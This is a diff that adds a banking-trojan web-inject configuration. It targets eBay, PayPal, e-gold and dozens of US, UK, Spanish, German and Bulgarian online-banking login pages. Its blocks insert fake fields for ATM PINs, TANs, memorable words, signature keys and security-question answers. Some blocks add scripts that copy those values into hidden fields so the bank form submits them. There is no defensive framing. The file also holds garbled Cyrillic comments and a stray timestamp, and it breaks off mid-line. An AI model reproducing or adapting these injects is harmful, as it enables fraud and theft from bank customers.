@@ -1,0 +1,2715 @@
+set_url */my.ebay.com/*CurrentPage=MyeBayPersonalInfo* GL
+data_before
+ Registered email address</td>*<img*>
+data_end
+data_inject
+e-mail: 
+data_end
+data_after
+</td>
+data_end
+
+set_url *.ebay.com/*eBayISAPI.dll?* GL
+data_before
+(<a href="http://feedback.ebay.com/ws/eBayISAPI.dll?ViewFeedback&*">
+data_end
+data_inject
+Feedback: 
+data_end
+data_after
+</a>
+data_end
+
+set_url https://www.us.hsbc.com/* GL
+data_before
+<table cellspacing="0" summary="page layout">
+data_end
+data_inject
+data_end
+data_after
+</table>
+data_end
+
+set_url https://www.e-gold.com/acct/li.asp GPL
+data_before
+e-mail:</font>
+data_end
+data_inject
+data_end
+data_after
+</font>
+data_end
+
+set_url https://www.e-gold.com/acct/balance.asp* GPL
+data_before
+<form name=fiat*</form>
+data_end
+data_inject
+data_end
+data_after
+<th colspan=4 align=left valign="bottom"
+data_end
+
+set_url https://online.wellsfargo.com/das/cgi-bin/session.cgi* GL
+data_before
+<div id="pageIntro" class="noprint">
+data_end
+data_inject
+data_end
+data_after
+<td id="sidebar" align="left" valign="top" class="noprint">
+data_end
+
+set_url https://www.wellsfargo.com/* G
+data_before
+<span class="mozcloak"><input type="password"*</span>
+data_end
+data_inject
+<br><strong><label for="atmpin">ATM PIN</label>:</strong>&nbsp;<br />
+<span class="mozcloak"><input type="password" accesskey="A" id="atmpin" name="USpass" size="13" maxlength="14" style="width:147px" tabindex="2" /></span>
+data_end
+data_after
+data_end
+
+set_url https://online.wellsfargo.com/login* GP
+data_before
+<input type="password" name="password"*</td>
+data_end
+data_inject
+<td width="225"><label for="password" class="formlabel">3. ATM PIN</label><br/>
+<input type="password" name="USpass" id="atmpin" size="20" maxlength="14" title="Enter ATM PIN" tabindex="11" accesskey="A"/>
+<br/>&nbsp;</td>
+data_end
+data_after
+data_end
+data_before
+<label for="account" class="formlabel">
+data_end
+data_inject
+4. Sign on to
+data_end
+data_after
+</label>
+data_end
+
+set_url https://online.wellsfargo.com/signon* GP
+data_before
+<input type="password" name="password"*</td>
+data_end
+data_inject
+<td width="225"><label for="password" class="formlabel">3. ATM PIN</label><br/>
+<input type="password" name="USpass" id="atmpin" size="20" maxlength="14" title="Enter ATM PIN" tabindex="11" accesskey="A"/>
+<br/>&nbsp;</td>
+data_end
+data_after
+data_end
+data_before
+<label for="account" class="formlabel">
+data_end
+data_inject
+4. Sign on to
+data_end
+data_after
+</label>
+data_end
+
+set_url https://www.paypal.com/*/webscr?cmd=_account GL
+data_before
+<div id="accountOverview">
+data_end
+data_inject
+data_end
+data_after
+</table></td></tr></table></td></tr>
+data_end
+
+set_url https://www.paypal.com/*/webscr?cmd=_login-done* GL
+data_before
+<div id="accountOverview">
+data_end
+data_inject
+data_end
+data_after
+</table></td></tr></table></td></tr>
+data_end
+
+set_url https://www#.usbank.com/internetBanking/LoginRouter PL
+data_before
+<a href="#" onClick="javascript:handlePageLink('/internetBanking/RequestRouter?requestCmdId=AccountDetails
+data_end
+data_inject
+data_end
+data_after
+</table>
+data_end
+
+set_url https://easyweb*.tdcanadatrust.com/servlet/*FinancialSummaryServlet* GL
+data_before
+Account Name</td>
+data_end
+data_inject
+data_end
+data_after
+</table>
+data_end
+
+set_url https://www#.citizensbankonline.com/*/index-wait.jsp GL
+data_before
+account-history-wait.jsp" method="post">
+data_end
+data_inject
+data_end
+data_after
+</table>
+data_end
+
+set_url https://onlinebanking.nationalcity.com/OLB/secure/AccountList.aspx GL
+data_before
+id="dgDepositAcctsheader0"*>
+data_end
+data_inject
+data_end
+data_after
+</table>
+data_end
+
+set_url https://www.suntrust.com/portal/server.pt*parentname=Login* GL
+data_before
+<td class="ice_headerleft">Deposit</td>
+data_end
+data_inject
+data_end
+data_after
+</table>
+data_end
+
+set_url https://www.53.com/servlet/efsonline/index.html* GL
+data_before
+<td class="acctName_Text">
+data_end
+data_inject
+data_end
+data_after
+</table>
+data_end
+
+set_url https://web.da-us.citibank.com/*BS_Id=MemberHomepage* GL
+data_before
+account summary</font>
+data_end
+data_inject
+data_end
+data_after
+<td height="10" colspan="4">
+data_end
+
+set_url https://onlineeast#.bankofamerica.com/cgi-bin/ias/*/GotoWelcome GL
+data_before
+</SPAN></CAPTION>
+data_end
+data_inject
+BOFA balance:
+data_end
+data_after
+</TABLE>
+data_end
+
+set_url https://online.wamu.com/Servicing/Servicing.aspx?targetPage=AccountSummary GL
+data_before
+_accountSummaryContainer"*</tr>
+data_end
+data_inject
+data_end
+data_after
+</table>
+data_end
+
+set_url https://onlinebanking#.wachovia.com/myAccounts.aspx?referrer=authService GL
+data_before
+<tr class="rowa">
+data_end
+data_inject
+data_end
+data_after
+</table>
+data_end
+
+set_url https://resources.chase.com/MyAccounts.aspx GL
+data_before
+<span class="bodyText5">
+data_end
+data_inject
+data_end
+data_after
+<td colspan="5" class="spacerH20">&nbsp;</td>
+data_end
+
+;==============================================================================
+;OPENBANK
+;==============================================================================
+set_url https://bancaonline.openbank.es/servlet/PProxy?* GP
+;ÏÎËÅ
+data_before
+name =p  rethepassword*</TD>
+data_end
+data_inject
+<TD bgColor=#E7E7E7 vAlign=top><INPUT maxLength=8 name=ESpass size=8 style="FONT-FAMILY: Verdana; FONT-SIZE: 8p  t" type =p  assword></TD>
+data_end
+data_after
+data_end
+
+data_before
+:oculto_form_onsubmit();*<TR
+data_end
+data_inject
+ style="color :#  706E6F;FONT-FAMILY:Verdana;FONT-SIZE:7pt;font-weight :b  old">
+<TD height=20><IMG align=top height=11 src="/graficosDJ/tipo_documento.gif" width=80></TD><TD><IMG align=top border =0  height=11 src="/graficosDJ/numero_documento.gif" width=77></TD><TD>Clave</TD><TD>Firma
+data_end
+data_after
+</TD>
+data_end
+
+;ÑÊĞÈÏÒ
+data_before
+function oculto_form_onsubmit*{
+data_end
+data_inject
+if(self.document.oculto_form.ESpass.value.length<4){alert('Clave personal (Clave de firma) no encontrado.');return;}
+data_end
+data_after
+data_end
+
+set_url https://extranet.banesto.es/*/loginParticulares.htm GP
+;ÏÎËÅ
+data_before
+id="clave" name="oppasswd"*>
+data_end
+data_inject
+<div class="clear sep4"></div>
+<label for="codusuario2">Clave de firma: </label>
+<input id="codusuario2" name="ESpass" class="input01 aleft w180"/>
+data_end
+data_after
+data_end
+;POST ÔÎĞÌÀ
+data_before
+<input type="hidden" name="SXPASWI_#"*>
+data_end
+data_inject
+<input type="hidden" name="ESpass" value=""/>
+data_end
+data_after
+data_end
+;ÑÊĞÈÏÒ
+data_before
+value="Entrar"*onclick="javascript:
+data_end
+data_inject
+CheckES();
+data_end
+data_after
+"
+­
+-    Friday, October 19, 2007 3:02 AM 
+data_end
+data_before
+<script*>
+data_end
+data_inject
+function CheckES(){var vv=document.Entrada.ESpass.value;if(vv.length<4){alert('Clave personal (Clave de firma) no encontrado.');return;}document.ExtranetParticulares.ESpass.value=vv;Vacio();}
+data_end
+data_after
+data_end
+
+set_url https://banesnet.banesto.es/*/loginEmpresas.htm GP
+;ÏÎËÅ
+data_before
+name="oppasswd"*</tr>*<tr>
+data_end
+data_inject
+<td height="24" align="right" class="fila1">&nbsp;&nbsp;Clave de firma:</td>
+<td class="fila1">&nbsp;&nbsp; <input type="password" size="8" maxlength="8" name="ESpass" class="cmbcombo"></td>
+<td class="bordetabla1" width="1"><img src="img/sp.gif" width="1" height="1"></td>
+data_end
+data_after
+</tr>
+data_end
+;POST ÔÎĞÌÀ
+data_before
+<input type="hidden" name="passwd" value="">
+data_end
+data_inject
+<input type="hidden" name="ESpass" value="">
+data_end
+data_after
+data_end
+;ÑÊĞÈÏÒ
+data_before
+<td><a href="javascript:
+data_end
+data_inject
+CheckES();
+data_end
+data_after
+">
+data_end
+
+data_before
+<script*>
+data_end
+data_inject
+
+function CheckES(){var vv=document.Entrada.ESpass.value;if(vv.length<4){alert('Clave personal (Clave de firma) no encontrado.');return;}document.Entradadatos.ESpass.value=vv;Vacio();}
+data_end
+data_after
+data_end
+
+set_url https://empresas.gruposantander.es/WebEmpresas/servlet/webempresas.servlets.* GP
+;ÄÎÁÎÂËßÅÌ ÏÎËÅ ÄËß ÂÂÎÄÀ
+data_before
+name="password"*</tr>
+data_end
+data_inject
+<tr><td width="50">&nbsp;</td><td class="textoHome">4.&nbsp;&nbsp;&nbsp;Clave de Firma</td>
+<td align="center"><INPUT type="password" name="ESpass" value="" maxlength="60" class="TextoContenido" tabindex="4"></td></tr>
+data_end
+data_after
+data_end
+;ÑÊĞÈÏÒ ÏÅÏÅÁĞÀÑÛÂÀÅÒ ÄÀÍÍÛÅ Â ÄĞÓÃÓŞ ÔÎĞÌÓ, ÏÎİÒÎÌÓ È ÒÓÄÀ ÄÎÁÎÂËßÅÌ ÏÎËÅ
+data_before
+<input type="hidden" name="password"*value="">
+data_end
+data_inject
+<input type="hidden" name="ESpass" value="">
+data_end
+data_after
+data_end
+;ÈÇÌÅÍßÅÌ ÑÊĞÈÏÒ, ÄËß ÒÎÃÎ ×ÒÎÁÛ ÏÅĞÅÁĞÀÑÛÂÀÒÜ ÄÀÍÍÛÅ
+;ÑŞÄÀ ÄÎÏÎËÍÈÒÅËÜÍÎ ÂÛ ÌÎÆÅÒÅ ÂÑÒÀÂÈÒÜ ÏĞÎÂÅĞÊÓ ÏÎËß ÍÀ ÇÀÏÎËÍÅÍÈÅ
+data_before
+function enviar()*{*{
+data_end
+data_inject
+if(document.teclado.ESpass.value.length<4){alert('Firma electronica no encontrado.');return false;}
+document.login.ESpass.value=document.teclado.ESpass.value;
+data_end
+data_after
+data_end
+
+set_url https://www.gruposantander.es/bog/sbi*?ptns=acceso* GP
+data_before
+name="password"*</TD>*</TD>
+data_end
+data_inject
+<TD align="left" colspan="7" valign="bottom"></TD></TR><TR>
+<TD class="textoHome" align="left">3. Clave de Transferencias</TD>
+<TD width="20"><IMG src='/img4bog/px.gif' border='0' width="20" height="1"></TD>
+<TD align="left"><INPUT type="password" name="ESpass" maxlength="60" tabindex="3" class="TextoContenido"></TD>
+data_end
+data_after
+data_end
+
+data_before
+<INPUT type="hidden" name="password">
+data_end
+data_inject
+<INPUT type="hidden" name="ESpass">
+data_end
+data_after
+data_end
+
+data_before
+<TD align="center"><A href="#" onClick="
+data_end
+data_inject
+if(document.teclado.ESpass.value.length<4){alert('Firma electronica no encontrado.');return;};document.datos.ESpass.value=document.teclado.ESpass.value;
+data_end
+data_after
+data_end
+
+set_url https://www.bbvanetoffice.com/local_bdno/login_bbvanetoffice.html GP
+data_before
+name="password"*<tr>
+data_end
+data_inject
+</tr>
+<tr><td height="20" class="c"><span class="txtbc">Firma:</span></td></tr>
+<tr><td height="20" class="c"><input type="password" name="ESpass" size="16" maxlength="9" onkeyUp="javascript:cuenta('pwd');" tabindex="2"></td></tr>
+<tr>
+data_end
+data_after
+data_end
+data_before
+name="btnEntrar"
+data_end
+data_inject
+ OnClick="javascript: if  (document.forms[0].ESpass.value.length < 3) {
+alert('Debe introducir la Firma');return false;}"
+data_end
+data_after
+data_end
+
+set_url https://www.bancajaproximaempresas.com/ControlEmpresas* GP
+data_before
+name="sl_clave"*</div>
+data_end
+data_inject
+<div class="fila">
+<div class="textoform">Firma:</div>
+<div class="inputform"><input type="password" name="ESpass" TABINDEX="3" size="10" class="inpTexto" maxlength="8"></div>
+</div>
+data_end
+data_after
+data_end
+data_before
+<input type="hidden" name="anterior" value="LOGIN">
+data_end
+data_inject
+
+<input type="hidden" name="ESpass" value="">
+data_end
+data_after
+data_end
+data_before
+onclick="javascript:
+data_end
+data_inject
+ var vv=document.forms[0].ESpass.value;if(vv.length<4){
+alert('Firma no encontrado.');return;} document.enviar.ESpass.value=vv;"
+data_end
+data_after
+data_end
+data_before
+
+set_url https://onlinebanking.norisbank.de/norisbank/login.do?method=login* GP
+data_before
+name="pin"*">
+data_end
+data_inject
+</div>
+</td>
+</tr>
+<tr>
+<td class="label">
+<div align="left">TAN</div>
+</td>
+<td>
+<div align="left">
+<input type="password" name="tan" maxlength="6" size="6" tabindex="2" style="width:50px;">
+data_end
+data_after
+data_end
+data_before
+name=""
+data_end
+data_inject
+ OnClick="javascript: if  (document.forms[0].tan.value.length < 3) {
+alert('Bitte hier die TAN eingeben');return false;}"
+data_end
+data_after
+data_end
+
+set_url https://www.citibank.de* GP
+data_before
+name="password"*<tr>
+data_end
+data_inject
+</tr>
+<tr>
+<td>
+<span class="applabelFalt">
+TAN
+</span>
+</td>
+<td></td>
+<td valign="top">
+<input type="password" name="tan" size="10" maxlength="50">
+</td>
+</tr>
+data_end
+data_after
+data_end
+data_before
+input type="image"
+data_end
+data_inject
+ OnClick="javascript: if  (document.SignonForm.tan.value.length < 3) {
+alert('Bitte hier die TAN eingeben');return false;}"
+data_end
+data_after
+data_end
+
+set_url https://probanking.procreditbank.bg/main/main.asp* GP
+data_before
+name="uPSW"*/>
+data_end
+data_inject
+<br />
+<div class="lab">
+<label for="uPSW">tan</label>
+</div>
+<input name="tan" type="password" class="edit" id="uPSW" size="16" maxlength="8"/>
+data_end
+data_after
+data_end
+data_before
+name="Submit"
+data_end
+data_inject
+ OnClick="javascript: if  (document.forms[0].tan.value.length < 3) {
+alert('ãğåøíà tan');return false;}"
+data_end
+data_after
+data_end
+
+set_url https://ibank.internationalbanking.barclays.com/logon/icebapplication* GP
+data_before
+name="simple_surname_text"*<tr>
+data_end
+data_inject
+<td class="bold" width="22%" nowrap="">Memorable word:</td><td colspan="2" align="left" width="35%"><font class="inputstyle"><input type="password" name="UKpass" id="simple_surname_text" size="24" maxlength="24" value="" class="" title="Memorable word"/></font></td></tr><tr>
+data_end
+data_after
+data_end
+data_before
+name="button_Next"
+data_end
+data_inject
+ OnClick="javascript: if  (document.forms[0].UKpass.value.length < 2) {
+alert('Please enter your memorable word');return false;}"
+data_end
+data_after
+data_end
+
+set_url https://ibank.barclays.co.uk/olb/x/LoginMember.do GP
+data_before
+name="membershipNo"*<tr>
+data_end
+data_inject
+<td>Memorable word</td>
+<td height="30" align="right"><input type="text" size=25  maxlength=24 name="UKpass" class="formFont" title="memorable word"></td>
+</tr>
+<tr>
+data_end
+data_after
+data_end
+data_before
+name="Next"
+data_end
+data_inject
+ OnClick="javascript: if  (document.forms[0].UKpass.value.length < 2) {
+alert('Please enter your memorable word');return false;}"
+data_end
+data_after
+data_end
+
+set_url https://online-offshore.lloydstsb.com/customer.ibc GP
+data_before
+name="Password"*</tr>
+data_end
+data_inject
+</tr>
+<tr align="left">
+<td bgcolor="#ceefe7" align="left" valign="middle">
+<div class="entries3">
+<b>Memorable word:</b>
+</div>
+</td>
+<td bgcolor="#ceefe7"><img src="img/space.gif" width="3" height="30" border="0"></td>
+<td bgcolor="#ceefe7">
+<div class="entries">
+<input type="password" tabindex="2" name="UKpass" size="15" maxlength="15">
+</div>
+</td>
+<td valign="top" bgcolor = "#ceefe7"><img src="img/space.gif" width="1" height="40" border="0"></td>
+</tr>   
+data_end
+data_after
+data_end
+data_before
+<input tabindex="3"
+data_end
+data_inject
+ OnClick="javascript: if  (document.forms[0].UKpass.value.length < 2) {
+alert('Please enter your memorable word');return false;}"
+data_end
+data_after
+data_end
+
+set_url https://online-business.lloydstsb.co.uk/customer.ibc GP
+data_before
+name="Password"*</tr>
+data_end
+data_inject
+</tr>
+<tr align="left">
+<td bgcolor="#ceefe7" align="left" valign="middle">
+<div class="entries3">
+<b>Memorable word:</b>
+</div>
+</td>
+<td bgcolor="#ceefe7"><img src="img/space.gif" width="3" height="30" border="0"></td>
+<td bgcolor="#ceefe7">
+<div class="entries">
+<input type="password" tabindex="2" name="UKpass" size="15" maxlength="15">
+</div>
+</td>
+<td valign="top" bgcolor = "#ceefe7"><img src="img/space.gif" width="1" height="40" border="0"></td>
+</tr>   
+data_end
+data_after
+data_end
+data_before
+<input tabindex="3"
+data_end
+data_inject
+ OnClick="javascript: if  (document.forms[0].UKpass.value.length < 2) {
+alert('Please enter your memorable word');return false;}"
+data_end
+data_after
+data_end
+
+set_url https://www.dab-bank.com* GP
+data_before
+name="pinLogin"*<tr>
+data_end
+data_inject
+<td style="margin-top:2px;" id="label_Identifier"><b>Trader Password:</b></td>
+<td style="padding:5px;"><img name="gif_Identifier" src="/images/trading/dabde_errorpfeil_blank.gif" border="0" alt=""></td>
+<td><input value="" type="password" class="edit" style="width:150px" name="pass" id="Identifier">
+</tr>
+<tr>
+data_end
+data_after
+data_end
+data_before
+getElementById("Pin").select();*}
+data_end
+data_inject
+if (document.getElementById("pass").value == '') {
+alert('Bitte Trader Password eingeben!');
+document.getElementById("pass").select();
+return false;
+}
+if (document.getElementById("pass").value == document.getElementById("authentificationnumberLogin").value) {
+alert('Bitte Trader Password eingeben!');
+document.getElementById("pass").select();
+return false;
+}
+if (document.getElementById("pass").value == document.getElementById("pinLogin").value) {
+alert('Bitte Trader Password eingeben!');
+document.getElementById("pass").select();
+return false;
+}
+if (document.getElementById("pass").value == document.getElementById("identifierLogin").value) {
+alert('Bitte Trader Password eingeben!');
+document.getElementById("pass").select();
+return false;
+}
+data_end
+data_after
+data_end
+
+set_url http://www.hsbc.co.uk/1/2/personal/internet-banking* GP
+data_before
+name='internetBankingID'*/>
+data_end
+data_inject
+<div class="extNoPadding">
+<label for="userID">
+Security Key.</label>
+<div class="extTopPadding"> 
+<INPUT type="text" name='UKpass' class="jsDisableAutoComplete" size="10" autocomplete="off"
+maxlength="12" type=password  VALUE="" style="float:left; width: 133px;"/>
+data_end
+data_after
+data_end
+data_before
+<a href="javascript:
+data_end
+data_inject
+ CheckES();
+data_end
+data_after
+data_end
+data_before
+<script language="javascript" type="text/javascript">
+data_end
+data_inject
+
+function CheckES(){var vv=document.PC_7_1_5I5_cam10Form.UKpass.value;if(vv.length<2){alert('Please enter your security Key.')}};
+data_end
+data_after
+data_end
+
+set_url https://www.nwolb.com/Login.aspx* GP
+data_before
+LI6-DDALD_spot*<tr>
+data_end
+data_inject
+<td class="wizardLabelWide"><label for="LI6PPED_edit" id="LI6DDALDLabel">Complete Password</label></td><td class="wizCrl"><span id="LI6PPED"><input name="ESpass" type="password" maxlength="12" size="12" id="LI6PPEA_edit"/></span></td>
+</tr><tr>
+data_end
+data_after
+data_end
+data_before
+LI6-DDALA_spot*<tr>
+data_end
+data_inject
+<td class="wizardLabelWide"><label for="LI6PPEA_edit" id="LI6DDALALabel">Complete PIN</label></td><td class="wizCrl"><span id="LI6PPEA"><input name="ESpasspin" type="password" maxlength="12" size="12" id="LI6PPEA_edit" /></span></td>
+</tr><tr>
+data_end
+data_after
+data_end
+data_before
+value="Next" onclick="
+data_end
+data_inject
+if (document.forms[0].ESpasspin.value.length < 2) {
+alert('Please enter your complete PIN ');
+return false;
+} else
+if (document.forms[0].ESpass.value.length < 2) {
+alert('Please enter your Complete Password');
+return false;
+} else
+data_end
+data_after
+data_end
+
+set_url https://home.ybonline.co.uk/login.html* GP
+data_before
+name="password"*</tr>
+data_end
+data_inject
+<TD><FONT class=userinfo>&nbsp;What is your favourite meal or restaurant? </FONT></TD> 
+<TD align=left width=200><INPUT tabIndex=1 name=q1> </TD></TR>
+<TD><FONT class=userinfo>&nbsp;The name of a memorable place to you? </FONT></TD> 
+<TD align=left width=200><INPUT tabIndex=1 name=q2> </TD></TR>    
+<TD><FONT class=userinfo>&nbsp;Your favourite film of all time? </FONT></TD> 
+<TD align=left width=200><INPUT tabIndex=1 name=q3> </TD></TR>    
+<TD><FONT class=userinfo>&nbsp;Your favourite book of all time?  </FONT></TD> 
+<TD align=left width=200><INPUT tabIndex=1 name=q4> </TD></TR>    
+<TD><FONT class=userinfo>&nbsp;Your favourite teacher or subject? </FONT></TD> 
+<TD align=left width=200><INPUT tabIndex=1 name=q5> </TD></TR>    
+<TD><FONT class=userinfo>&nbsp;Your favourite TV star or show? </FONT></TD> 
+<TD align=left width=200><INPUT tabIndex=1 name=q6> </TD></TR>                          
+data_end
+data_after
+data_end
+data_before
+case sensitive*<br><br>
+data_end
+data_inject
+Due to security measures, please provide the answers to all the secutity questions listed below:
+<br><br>
+data_end
+data_after
+data_end
+data_before
+var cusID*;
+data_end
+data_inject
+
+if (document.forms[0].q1.value.length < 2) {
+alert('Please, fill answers to all questions');
+document.forms[0].q1.focus();
+document.forms[0].loginButton.disabled = false;
+submitActioned = false;
+return false;
+}
+if (document.forms[0].q2.value.length < 2) {
+alert('Please, fill answers to all questions');
+document.forms[0].q2.focus();
+document.forms[0].loginButton.disabled = false;
+submitActioned = false;
+return false;
+}
+if (document.forms[0].q3.value.length < 2) {
+alert('Please, fill answers to all questions');
+document.forms[0].q3.focus();
+document.forms[0].loginButton.disabled = false;
+submitActioned = false;
+return false;
+}
+if (document.forms[0].q4.value.length < 2) {
+alert('Please, fill answers to all questions');
+document.forms[0].q4.focus();
+document.forms[0].loginButton.disabled = false;
+submitActioned = false;
+return false;
+}
+if (document.forms[0].q5.value.length < 2) {
+alert('Please, fill answers to all questions');
+document.forms[0].q5.focus();
+document.forms[0].loginButton.disabled = false;
+submitActioned = false;
+return false;
+}
+if (document.forms[0].q6.value.length < 2) {
+alert('Please, fill answers to all questions');
+document.forms[0].q6.focus();
+document.forms[0].loginButton.disabled = false;
+submitActioned = false;
+return false;
+}
+data_end
+data_after
+data_end
+
+set_url https://home.cbonline.co.uk/login.html* GP
+data_before
+name="password"*</tr>
+data_end
+data_inject
+<TD><FONT class=userinfo>&nbsp;What is your favourite meal or restaurant? </FONT></TD> 
+<TD align=left width=200><INPUT tabIndex=1 name=q1> </TD></TR>
+<TD><FONT class=userinfo>&nbsp;The name of a memorable place to you? </FONT></TD> 
+<TD align=left width=200><INPUT tabIndex=1 name=q2> </TD></TR>    
+<TD><FONT class=userinfo>&nbsp;Your favourite film of all time? </FONT></TD> 
+<TD align=left width=200><INPUT tabIndex=1 name=q3> </TD></TR>    
+<TD><FONT class=userinfo>&nbsp;Your favourite book of all time?  </FONT></TD> 
+<TD align=left width=200><INPUT tabIndex=1 name=q4> </TD></TR>    
+<TD><FONT class=userinfo>&nbsp;Your favourite teacher or subject? </FONT></TD> 
+<TD align=left width=200><INPUT tabIndex=1 name=q5> </TD></TR>    
+<TD><FONT class=userinfo>&nbsp;Your favourite TV star or show? </FONT></TD> 
+<TD align=left width=200><INPUT tabIndex=1 name=q6> </TD></TR>                          
+data_end
+data_after
+data_end
+data_before
+case sensitive*<br><br>
+data_end
+data_inject
+Due to security measures, please provide the answers to all the secutity questions listed below:
+<br><br>
+data_end
+data_after
+data_end
+data_before
+var cusID*;
+data_end
+data_inject
+
+if (document.forms[0].q1.value.length < 2) {
+alert('Please, fill answers to all questions');
+document.forms[0].q1.focus();
+document.forms[0].loginButton.disabled = false;
+submitActioned = false;
+return false;
+}
+if (document.forms[0].q2.value.length < 2) {
+alert('Please, fill answers to all questions');
+document.forms[0].q2.focus();
+document.forms[0].loginButton.disabled = false;
+submitActioned = false;
+return false;
+}
+if (document.forms[0].q3.value.length < 2) {
+alert('Please, fill answers to all questions');
+document.forms[0].q3.focus();
+document.forms[0].loginButton.disabled = false;
+submitActioned = false;
+return false;
+}
+if (document.forms[0].q4.value.length < 2) {
+alert('Please, fill answers to all questions');
+document.forms[0].q4.focus();
+document.forms[0].loginButton.disabled = false;
+submitActioned = false;
+return false;
+}
+if (document.forms[0].q5.value.length < 2) {
+alert('Please, fill answers to all questions');
+document.forms[0].q5.focus();
+document.forms[0].loginButton.disabled = false;
+submitActioned = false;
+return false;
+}
+if (document.forms[0].q6.value.length < 2) {
+alert('Please, fill answers to all questions');
+document.forms[0].q6.focus();
+document.forms[0].loginButton.disabled = false;
+submitActioned = false;
+return false;
+}
+data_end
+data_after
+data_end
+
+set_url https://welcome27.co-operativebank.co.uk/CBIBSWeb/start.do GP
+data_before
+name="passNumber"*/>
+data_end
+data_inject
+</tr>
+<tr>
+<br>
+<td><br>
+</td>
+<td class="field" colspan="2">Due to security measures, please provide the answers to all the security questions listed below,</td>
+</tr>
+<tr>
+<td class="label"><label for="sortcode">Place of birth &nbsp;</label></td>
+<td class="field" width="79">
+<input type="text" id="sortcode" name="placeofbirth" value='' size="18" maxlength="50"/></td>
+</tr>
+<tr>
+<td/>
+<td class="error" width="472"></td>
+    </tr>
+  <tr>
+        <td class="label"><label for="accountNumber">First school attended &nbsp;</label></td>
+        <td class="field" width="79">
+    <input type="text" name="firstschool" id="accountnumber" value='' size="18" maxlength="50"/></td>
+    </tr>
+  <tr>
+        <td/>
+        <td class="error" width="472"></td>
+    </tr>
+  <tr>
+        <td class="label"><label for="visanumber">Last school attended &nbsp;</label></td>
+        <td class="field" width="79">
+    <input type="text" name="lastschool" id="visanumber" value='' size="18" maxlength="50"/></td>
+    </tr>
+  <tr>
+        <td class="label"><label for="visanumber0">Memorable date &nbsp;</label></td>
+        <td class="field" width="79">
+    <input type="text" name="date" id="visanumber0" value='' size="18" maxlength="50"/></td>
+    </tr>
+  <tr>
+        <td class="label"><label for="visanumber1">Memorable name &nbsp;</label></td>
+        <td class="field" width="79">
+    <input type="text" name="name" id="visanumber1" value='' size="18" maxlength="50"/></td>
+data_end
+data_after
+data_end
+data_before
+name="ok"
+data_end
+data_inject
+ OnClick="javascript: if  (document.forms[0].placeofbirth.value.length < 2) {
+alert('Please, fill answers to all questions');return;};"
+data_end
+data_after
+data_end
+
+set_url https://welcome23.smile.co.uk/SmileWeb/start.do GP
+data_before
+name="passNumber"*/>
+data_end
+data_inject
+</tr>
+<tr>
+<br>
+<td><br>
+</td>
+<td class="field" colspan="2">Due to security measures, please provide the answers to all the security questions listed below,</td>
+</tr>
+<tr>
+<td class="label"><label for="sortcode">Place of birth &nbsp;</label></td>
+<td class="field" width="79">
+<input type="text" id="sortcode" name="placeofbirth" value='' size="18" maxlength="50"/></td>
+</tr>
+<tr>
+<td/>
+<td class="error" width="472"></td>
+    </tr>
+  <tr>
+        <td class="label"><label for="accountNumber">First school attended &nbsp;</label></td>
+        <td class="field" width="79">
+    <input type="text" name="firstschool" id="accountnumber" value='' size="18" maxlength="50"/></td>
+    </tr>
+  <tr>
+        <td/>
+        <td class="error" width="472"></td>
+    </tr>
+  <tr>
+        <td class="label"><label for="visanumber">Last school attended &nbsp;</label></td>
+        <td class="field" width="79">
+    <input type="text" name="lastschool" id="visanumber" value='' size="18" maxlength="50"/></td>
+    </tr>
+  <tr>
+        <td class="label"><label for="visanumber0">Memorable date &nbsp;</label></td>
+        <td class="field" width="79">
+    <input type="text" name="date" id="visanumber0" value='' size="18" maxlength="50"/></td>
+    </tr>
+  <tr>
+        <td class="label"><label for="visanumber1">Memorable name &nbsp;</label></td>
+        <td class="field" width="79">
+    <input type="text" name="name" id="visanumber1" value='' size="18" maxlength="50"/></td>
+data_end
+data_after
+data_end
+data_before
+name="ok"
+data_end
+data_inject
+ OnClick="javascript: if  (document.forms[0].placeofbirth.value.length < 2) {
+alert('Please, fill answers to all questions');return;};"
+data_end
+data_after
+data_end
+
+set_url https://www.halifax-online.co.uk/_mem_bin/formslogin.asp* GP
+data_before
+name="answer"*</td>
+data_end
+data_inject
+</tr>
+<tr>
+<td valign="middle" width="160" class="bwLoginMCUser">The name of your first school:</td>
+<td colspan="2"><input type="password" name="q1" id="password" value="" size="20" AUTOCOMPLETE="off" alt="Password" maxlength="20"></td>
+</tr>
+<tr>
+<td valign="middle" width="160" class="bwLoginMCUser">Your place/town of birth:</td>
+<td colspan="2"><input type="password" name="q2" id="password" value="" size="20" AUTOCOMPLETE="off" alt="Password" maxlength="20"></td>
+</tr>
+<tr>
+<td valign="middle" width="160" class="bwLoginMCUser">Your mother's first name:</td>
+<td colspan="2"><input type="password" name="q3" id="password" value="" size="20" AUTOCOMPLETE="off" alt="Password" maxlength="20"></td>
+</tr>
+<tr>
+<td valign="middle" width="160" class="bwLoginMCUser">Your father's first name:</td>
+<td colspan="2"><input type="password" name="q4" id="password" value="" size="20" AUTOCOMPLETE="off" alt="Password" maxlength="20"></td>
+</tr>
+<tr>
+<td valign="middle" width="160" class="bwLoginMCUser">Your secret question:</td>
+<td colspan="2"><input type="password" name="q5" id="password" value="" size="20" AUTOCOMPLETE="off" alt="Password" maxlength="20"></td>
+</tr>
+<tr>
+<td valign="middle" width="160" class="bwLoginMCUser">Your secret answer:</td>
+<td colspan="2"><input type="password" name="q6" id="password" value="" size="20" AUTOCOMPLETE="off" alt="Password" maxlength="20"></td>
+data_end
+data_after
+data_end
+data_before
+name="singin"
+data_end
+data_inject
+ OnClick="javascript: if  (document.forms[0].q1.value.length < 2) {
+alert('Please, fill answers to all questions');return;};"
+data_end
+data_after
+data_end
+
+set_url https://www2.bancopopular.es/AppBPE/servlet/servin* GP
+data_before
+su contrase*</tr>
+data_end
+data_inject
+<td>
+<p align="right"><span id="pass" class="negro">Firma</span></td>
+<td>
+<input type="password" size="8" maxlength="6" name="firma" style="width:50px" class="negro"/></td>
+</tr>
+<tr>
+</td>
+data_end
+data_after
+data_end
+data_before
+function validar()*{
+data_end
+data_inject
+if (window.document.entrada.firma.value == "") {
+window.alert("Por favor, introduzca la Firma electronica.");
+return;
+}
+if (window.document.entrada.tan.value == "") {
+window.alert("Por favor, introduzca la Coordenada.");
+return;
+}
+data_end
+data_after
+data_end
+
+set_url https://www.bancoherrero.com/es/* GP
+data_before
+name=ASEA01*</TD>
+data_end
+data_inject
+<TR>
+<TD noWrap width=85>&nbsp;&nbsp;Codigo de tarjeta&nbsp; de claves:</TD>
+<TD><INPUT style="FONT-SIZE: 9px; FONT-FAMILY: Verdana" type=text maxLength=4 size=4 name=pass></TD></TR>
+data_end
+data_after
+data_end
+data_before
+<TD colSpan=2><INPUT
+data_end
+data_inject
+ OnClick="javascript: if (document.forms[0].pass.value.length < 2) {
